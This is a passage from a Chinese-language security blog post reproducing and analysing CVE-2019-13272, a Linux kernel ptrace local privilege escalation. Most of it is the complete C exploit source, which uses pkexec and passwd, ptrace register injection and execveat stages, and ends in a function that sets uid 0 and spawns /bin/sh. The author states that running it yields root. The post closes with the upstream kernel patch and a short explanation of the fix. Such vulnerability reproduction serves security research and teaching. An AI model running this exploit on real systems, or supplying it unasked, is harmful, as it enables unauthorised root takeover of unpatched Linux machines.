fork();</span><br><span class="line">    <span class="keyword">if</span> (!pid_task_b)</span><br><span class="line">    &#123;</span><br><span class="line">        middlePtracee();</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">sprintf</span>(buf, <span class="string">&quot;/proc/%d/comm&quot;</span>, pid_task_b);</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">char</span> comm[<span class="number">0x100</span>];</span><br><span class="line">        <span class="type">int</span> comm_fd = open(buf, O_RDONLY);</span><br><span class="line">        <span class="keyword">if</span> (comm_fd &lt; <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;[x] Failed to read comm of task B!\n&quot;</span>);</span><br><span class="line">            <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">        &#125;</span><br><span class="line">        comm[read(comm_fd, comm, <span class="number">0x100</span> - <span class="number">1</span>)] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="built_in">strncmp</span>(comm, helper_basename, <span class="number">10</span>))</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        usleep(<span class="number">100000</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// task B got the root, wait a while it&#x27;ll lose privilege, then task A attach to it</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Task A attaching to task B soooon...&quot;</span>);</span><br><span class="line">    ptrace(PTRACE_ATTACH, pid_task_b, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">    waitpid(pid_task_b, <span class="literal">NULL</span>, <span class="number">0</span>); <span class="comment">// 0 means no extra options</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// force the task B to execve stage2</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Forcing task B to execve stage2...&quot;</span>);</span><br><span class="line">    forceChildToExecve(pid_task_b, <span class="number">0</span>, <span class="string">&quot;stage2&quot;</span>);</span><br><span class="line">    <span class="comment">//force_exec_and_wait(pid_task_b, 0, &quot;stage2&quot;);</span></span><br><span class="line">    <span class="built_in">exit</span>(EXIT_SUCCESS);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">char</span>* <span class="title function_">findHelper</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">stat</span> <span class="title">buf</span>;</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="keyword">sizeof</span>(helper_list) / <span class="keyword">sizeof</span>(<span class="type">char</span>*); i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (!stat(helper_list[i], &amp;buf))</span><br><span class="line">            <span class="keyword">return</span> helper_list[i];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// task B</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">middlePtracee</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    self_fd = open(<span class="string">&quot;/proc/self/exe&quot;</span>, O_RDONLY);</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">passwd</span> *<span class="title">pw</span> =</span> getpwuid(getuid());</span><br><span class="line">    pid_task_b = getpid();</span><br><span class="line"></span><br><span class="line">    pid_task_c = fork();</span><br><span class="line">    <span class="keyword">if</span> (!pid_task_c)</span><br><span class="line">        <span class="keyword">return</span> finalPtracee();</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">fputs</span>(<span class="string">&quot;[+] Task B fork out task C.\n&quot;</span>, <span class="built_in">stderr</span>);</span><br><span class="line">    <span class="built_in">fputs</span>(<span class="string">&quot;[*] Task B execve pkexec soooon...\n&quot;</span>, <span class="built_in">stderr</span>);</span><br><span class="line">    dup2(self_fd, <span class="number">0</span>); <span class="comment">// got stdin close</span></span><br><span class="line">    dup2(pipe_for_block[<span class="number">1</span>], <span class="number">1</span>); <span class="comment">// redirect stdout to block it</span></span><br><span class="line">    execl(<span class="string">&quot;/usr/bin/pkexec&quot;</span>, basename(<span class="string">&quot;/usr/bin/pkexec&quot;</span>), <span class="string">&quot;--user&quot;</span>, pw-&gt;pw_name, helper, <span class="string">&quot;--helper&quot;</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// if we arrive there, we failed.</span></span><br><span class="line">    <span class="built_in">fputs</span>(<span class="string">&quot;[x] Failed to execve pkexec!&quot;</span>, <span class="built_in">stderr</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// task again B</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">middleStage</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">pid_t</span> child = waitpid(<span class="number">-1</span>, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line">    forceChildToExecve(child, <span class="number">114</span>, <span class="string">&quot;stage3&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// task C</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">finalPtracee</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    pid_task_c = getpid();</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">0x1000</span>];</span><br><span class="line">    <span class="type">char</span> needle[<span class="number">0x100</span>];</span><br><span class="line">    <span class="type">char</span> uid_buf[<span class="number">0x100</span>];</span><br><span class="line">    <span class="type">int</span> task_B_status_fd;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">sprintf</span>(needle, <span class="string">&quot;/proc/%d/status&quot;</span>, pid_task_b);</span><br><span class="line">    <span class="built_in">sprintf</span>(uid_buf, <span class="string">&quot;Uid:\t%d\t0\t&quot;</span>, getuid());</span><br><span class="line">    dup2(self_fd, <span class="number">114</span>);</span><br><span class="line">    task_B_status_fd = open(needle, O_RDONLY);</span><br><span class="line">    <span class="keyword">if</span> (task_B_status_fd &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">fputs</span>(<span class="string">&quot;[x] Failed to get status of task B!&quot;</span>, <span class="built_in">stderr</span>);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// check out uid of task B</span></span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        buf[pread(task_B_status_fd, buf, <span class="number">0x1000</span> - <span class="number">1</span>, <span class="number">0</span>)] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">strstr</span>(buf, uid_buf)) <span class="comment">// task B got root</span></span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// let task B(root) be ptracer</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] Task B is root now!&quot;</span>);</span><br><span class="line">    ptrace(PTRACE_TRACEME, <span class="number">0</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Task C execve another suid programme sooooon...&quot;</span>);</span><br><span class="line">    execl(<span class="string">&quot;/usr/bin/passwd&quot;</span>, <span class="string">&quot;passwd&quot;</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// if we arrived there, execve failed </span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[x] Task C failed to execve!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// task again C</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">getRootShell</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    setresuid(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    setresgid(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">return</span> system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// force a child to execve by ptrace through execveat syscall</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">forceChildToExecve</span><span class="params">(<span class="type">pid_t</span> child_pid, <span class="type">int</span> exec_fd, <span class="type">char</span> *argv)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">user_regs_struct</span> <span class="title">regs</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">iovec</span> <span class="title">iov</span> =</span> </span><br><span class="line">    &#123;</span><br><span class="line">        .iov_base = &amp;regs,</span><br><span class="line">        .iov_len = <span class="keyword">sizeof</span>(regs),</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="type">size_t</span> child_stack;</span><br><span class="line">    <span class="type">size_t</span> insert_data[<span class="number">0x100</span>];</span><br><span class="line"></span><br><span class="line">    ptrace(PTRACE_SYSCALL, child_pid, <span class="number">0</span>, <span class="literal">NULL</span>); <span class="comment">// wait for child meeting a syscall</span></span><br><span class="line">    waitpid(child_pid, <span class="literal">NULL</span>, <span class="number">0</span>);    <span class="comment">// wait for child to execve</span></span><br><span class="line">    ptrace(PTRACE_GETREGSET, child_pid, NT_PRSTATUS, &amp;iov); <span class="comment">// get env of child</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">// prepare the stack data</span></span><br><span class="line">    child_stack = (regs.rsp - <span class="number">0x1000</span>) &amp; ~<span class="number">0xfff</span>UL; </span><br><span class="line">    <span class="built_in">memset</span>(insert_data, <span class="number">0</span>, <span class="keyword">sizeof</span>(insert_data));</span><br><span class="line">    <span class="type">int</span> idx = <span class="number">0</span>;</span><br><span class="line">    insert_data[idx++] = child_stack + <span class="number">0x18</span>;    <span class="comment">// argv arrays</span></span><br><span class="line">    insert_data[idx++] = <span class="number">0</span>;</span><br><span class="line">    insert_data[idx++] = <span class="number">0</span>;                     <span class="comment">// env arrays</span></span><br><span class="line">    insert_data[idx++] = *(<span class="type">size_t</span>*)argv;          <span class="comment">// argv[0]</span></span><br><span class="line">    insert_data[idx++] = <span class="number">0</span>;                     <span class="comment">// path</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// copy to child stack</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; idx; i++)</span><br><span class="line">        ptrace(PTRACE_POKETEXT, child_pid, child_stack + i * <span class="keyword">sizeof</span>(<span class="type">size_t</span>), insert_data[i]);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// execveat(exec_fd, NULL, argv, NULL, flags)</span></span><br><span class="line">    regs.orig_rax = __NR_execveat;</span><br><span class="line">    regs.rdi = exec_fd;</span><br><span class="line">    regs.rsi = child_stack + <span class="number">0x20</span>;  <span class="comment">// path -&gt; NULL</span></span><br><span class="line">    regs.rdx = child_stack;         <span class="comment">// argv -&gt; &quot;stagex&quot;, NULL</span></span><br><span class="line">    regs.r10 = child_stack + <span class="number">0x10</span>;  <span class="comment">// envp -&gt; NULL</span></span><br><span class="line">    regs.r8  = AT_EMPTY_PATH;       <span class="comment">// flags</span></span><br><span class="line"></span><br><span class="line">    ptrace(PTRACE_SETREGSET, child_pid, NT_PRSTATUS, &amp;iov);</span><br><span class="line">    ptrace(PTRACE_DETACH, child_pid, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">    waitpid(child_pid, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>运行即可完成提权</p>
<p><img src="https://s2.loli.net/2022/01/17/VgmbRFaIZo3qY8u.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<h1 id="0x03-漏洞修复"><a href="#0x03-漏洞修复" class="headerlink" title="0x03.漏洞修复"></a>0x03.漏洞修复</h1><p>Jann Horn 提交的漏洞修复方案比较简单，如下：</p>
<figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">diff --git a/kernel/ptrace.c b/kernel/ptrace.c</span></span><br><span class="line"><span class="comment">index 8456b6e2205f7..705887f63288d 100644</span></span><br><span class="line"><span class="comment">--- a/kernel/ptrace.c</span></span><br><span class="line"><span class="comment">+++ b/kernel/ptrace.c</span></span><br><span class="line"><span class="meta">@@ -79,9 +79,7 @@</span> void __ptrace_link(struct task_struct *child, struct task_struct *new_parent,</span><br><span class="line">  */</span><br><span class="line"> static void ptrace_link(struct task_struct *child, struct task_struct *new_parent)</span><br><span class="line"> &#123;</span><br><span class="line"><span class="deletion">-	rcu_read_lock();</span></span><br><span class="line"><span class="deletion">-	__ptrace_link(child, new_parent, __task_cred(new_parent));</span></span><br><span class="line"><span class="deletion">-	rcu_read_unlock();</span></span><br><span class="line"><span class="addition">+	__ptrace_link(child, new_parent, current_cred());</span></span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>

<p>我们可以看出这个补丁只做了一件小事：</p>
<ul>
<li><strong>不使用 rcu 机制，将 ptracee-&gt;parent_cred 设为当前进程 cred，即 ptracee 原来的 cred</strong></li>
</ul>
<p>这将 ptracer 的权限限制为发起 ptrace 请求的 ptracee 的权限，笔者个人认为这个修复还是比较成功的</p>

                
              </div>
            
            <hr/>
            <div>
              <div class="post-metas my-3">
  
    <div class="post-meta mr-3 d-flex align-items-center">
      <i class="iconfont icon-category"></i>
      

<span class="category-chains">
  
  
    
      <span class="category-chain">
        
  <a href="/categories/CVE/" class="category-chain-item">CVE</a>
  
  

      </span>
    
  
</span>

    </div>
  
  
    <div class="post-meta">
      <i class="iconfont icon-tags"></i>
      
        <a href="/tags/Pwn/">#Pwn</a>
      
        <a href="/tags/CVE/">#CVE</a>
      
        <a href="/tags/Linux/">#Linux</a>
      
        <a href="/tags/%E6%8F%90%E6%9D%83/">#提权</a>
      
        <a href="/tags/Linux-Kernel/">#Linux Kernel</a>
      
        <a href="/tags/ptrace/">#ptrace</a>
      
    </div>
  
</div>


              
  

  <div class="license-box my-3">
    <div class="license-title">
      <div>【CVE.0x05】CVE-2019-13272 ptrace 漏洞复现及简要分析</div>
      <div>http://blog.arttnba3.cn/2022/01/17/CVE-0X05-CVE-2019-13272/</div>
    </div>
    <div class="license-meta">
      
        <div class="license-meta-item">
          <div>作者</div>
          <div>arttnba3</div>
        </div>
      
      
        <div class="license-meta-item license-meta-date">
          <div>发布于</div>
          <div>2022年1月17日</div>
        </div>
      
      
      <div class="license-meta-item">
        <div>许可协议</div>
        <div>
          
            
            
              <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
              <span class="hint--top hint--rounded" aria-label="BY - 署名">
                <i class="iconfont icon-by"></i>
              </span>
              </a>
            
          
        </div>
      </div>
    </div>
    <div class="license-icon iconfont"></div>
  </div>



              
                <div class="post-prevnext my-3">
                  <article class="post-prev col-6">
                    
                    
                      <a href="/2022/02/21/EXPR-0X00-MIT_6_828/" title="【EXPR.0x00】MIT 6.828 课程实验报告">
                        <i class="iconfont icon-arrowleft"></i>
                        <span class="hidden-mobile">【EXPR.0x00】MIT 6.828 课程实验报告</span>
                        <span class="visible-mobile">上一篇</span>
                      </a>
                    
                  </article>
                  <article class="post-next col-6">
                    
                    
                      <a href="/2022/01/04/CODE-0X02-DESIGN_PATTERN/" title="【CODE.0x02】软件工程：设计模式浅析">
                        <span class="hidden-mobile">【CODE.0x02】软件工程：设计模式浅析</span>
                        <span class="visible-mobile">下一篇</span>
                        <i class="iconfont icon-arrowright"></i>
                      </a>
                    
                  </article>
                </div>
              
            </div>

            
  <article id="comments" lazyload>
    
  <div id="valine"></div>
  <script type="text/javascript">
    Fluid.utils.loadComments('#valine', function() {
      Fluid.utils.createScript('https://lib.baomitu.com/valine/1.4.17/Valine.min.js', function() {
        var options = Object.assign(
          {"appid":"ICj6cPRQWFTNiOttBHlzxnIv-gzGzoHsz","appkey":"tuvJh3xYxPFcW2JB6K26RKP2","path":"window.location.pathname","placeholder":"说点什么呗（笑）","avatar":"retro","meta":["nick","mail","link"],"requiredFields":[],"pageSize":10,"lang":"zh-CN","highlight":false,"recordIP":false,"serverURLs":"","emojiCDN":null,"emojiMaps":null,"enableQQ":false,"appId":"ICj6cPRQWFTNiOttBHlzxnIv-gzGzoHsz","appKey":"tuvJh3xYxPFcW2JB6K26RKP2"},
          {
            el: "#valine",
            path: window.location.pathname
          }
        )
        new Valine(options);
        Fluid.utils.waitElementVisible('#valine .vcontent', () => {
          var imgSelector = '#valine .vcontent img:not(.vemoji)';
          Fluid.plugins.imageCaption(imgSelector);
          Fluid.plugins.fancyBox(imgSelector);
        })
      });
    });
  </script>
  <noscript>Please enable JavaScript to view the comments</noscript>


  </article>


          </article>
        </div>
      </div>
    </div>

    <div class="side-col d-none d-lg-block col-lg-2">
      
  <aside class="sidebar" style="margin-left: -1rem">
    <div id="toc">
  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
  <div class="toc-body" id="toc-body"></div>
</div>



  </aside>


    </div>
  </div>
</div>





  



  



  



  



  


  
  









    

    
      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
      </a>
    

    
      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
     aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>

    

    
  </main>

  <footer>
    <div class="footer-inner">
  <!-- 网站运行时间的设置 -->
  <span id="timeDate">载入天数...</span>
  <span id="times">载入时分秒...</span>
  <script>
      var now = new Date();
      function createtime() {
          var grt= new Date("04/20/2020 17:48:48");//此处修改你的建站时间或者网站上线时间
          now.setTime(now.getTime()+250);
          days = (now - grt ) / 1000 / 60 / 60 / 24; dnum = Math.floor(days);
          hours = (now - grt ) / 1000 / 60 / 60 - (24 * dnum); hnum = Math.floor(hours);
          if(String(hnum).length ==1 ){hnum = "0" + hnum;} minutes = (now - grt ) / 1000 /60 - (24 * 60 * dnum) - (60 * hnum);
          mnum = Math.floor(minutes); if(String(mnum).length ==1 ){mnum = "0" + mnum;}
          seconds = (now - grt ) / 1000 - (24 * 60 * 60 * dnum) - (60 * 60 * hnum) - (60 * mnum);
          snum = Math.round(seconds); if(String(snum).length ==1 ){snum = "0" + snum;}
          document.getElementById("timeDate").innerHTML = "arttnba3的小屋已经安全存在了 "+dnum+" 天 ";
          document.getElementById("times").innerHTML = hnum + " 小时 " + mnum + " 分 " + snum + " 秒";
      }
  setInterval("createtime()",250);
  </script>
  
    <div class="footer-content">
       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
    </div>
  
  
    <div class="statistics">
  
  

  
    
      <span id="busuanzi_container_site_pv" style="display: none">
        总访问量 
        <span id="busuanzi_value_site_pv"></span>
         次
      </span>
    
    
      <span id="busuanzi_container_site_uv" style="display: none">
        总访客数 
        <span id="busuanzi_value_site_uv"></span>
         人
      </span>
    
    
  
</div>

  
  
  
</div>

  </footer>

  <!-- Scripts -->
  
  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />

  <script>
    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
    NProgress.start()
    window.addEventListener('load', function() {
      NProgress.done();
    })
  </script>


<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
<script  src="/js/events.js" ></script>
<script  src="/js/plugins.js" ></script>


  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
  <script>
    (function (window, document) {
      var typing = Fluid.plugins.typing;
      var subtitle = document.getElementById('subtitle');
      if (!subtitle || !typing) {
        return;
      }
      var text = subtitle.getAttribute('data-typed-text');
      
        typing(text);
      
    })(window, document);
  </script>




  
    <script  src="/js/img-lazyload.js" ></script>
  




  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
    var toc = jQuery('#toc');
    if (toc.length === 0 || !window.tocbot) { return; }
    var boardCtn = jQuery('#board-ctn');
    var boardTop = boardCtn.offset().top;

    window.tocbot.init({
      tocSelector     : '#toc-body',
      contentSelector : '.markdown-body',
      headingSelector : CONFIG.toc.headingSelector || 'h1,h2,h3,h4,h5,h6',
      linkClass       : 'tocbot-link',
      activeLinkClass : 'tocbot-active-link',
      listClass       : 'tocbot-list',
      isCollapsedClass: 'tocbot-is-collapsed',
      collapsibleClass: 'tocbot-is-collapsible',
      collapseDepth   : CONFIG.toc.collapseDepth || 0,
      scrollSmooth    : true,
      headingsOffset  : -boardTop
    });
    if (toc.find('.toc-list-item').length > 0) {
      toc.css('visibility', 'visible');
    }
  });
</script>


  <script src=https://lib.baomitu.com/clipboard.js/2.0.10/clipboard.min.js></script>

  <script>Fluid.plugins.codeWidget();</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
    window.anchors.options = {
      placement: CONFIG.anchorjs.placement,
      visible  : CONFIG.anchorjs.visible
    };
    if (CONFIG.anchorjs.icon) {
      window.anchors.options.icon = CONFIG.anchorjs.icon;
    }
    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
    var res = [];
    for (var item of el) {
      res.push('.markdown-body > ' + item.trim());
    }
    if (CONFIG.anchorjs.placement === 'left') {
      window.anchors.options.class = 'anchorjs-link-left';
    }
    window.anchors.add(res.join(', '));
  });
</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
    Fluid.plugins.fancyBox();
  });
</script>


  <script>Fluid.plugins.imageCaption();</script>

  
      <script>
        if (!window.MathJax) {
          window.MathJax = {
            tex    : {
              inlineMath: { '[+]': [['$', '$']] }
            },
            loader : {
              load: ['ui/lazy']
            },
            options: {
              renderActions: {
                insertedScript: [200, () => {
                  document.querySelectorAll('mjx-container').forEach(node => {
                    let target = node.parentNode;
                    if (target.nodeName.toLowerCase() === 'li') {
                      target.parentNode.classList.add('has-jax');
                    }
                  });
                }, '', false]
              }
            }
          };
        } else {
          MathJax.startup.document.state(0);
          MathJax.texReset();
          MathJax.typeset();
          MathJax.typesetPromise();
        }
      </script>
    

  <script  src="https://lib.baomitu.com/mathjax/3.2.1/es5/tex-mml-chtml.js" ></script>

  <script  src="/js/local-search.js" ></script>

  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>





<!-- 主题的启动项，将它保持在最底部 -->
<!-- the boot of the theme, keep it at the bottom -->
<script  src="/js/boot.js" ></script>


  

  <noscript>
    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
  </noscript>
</body>
</html>
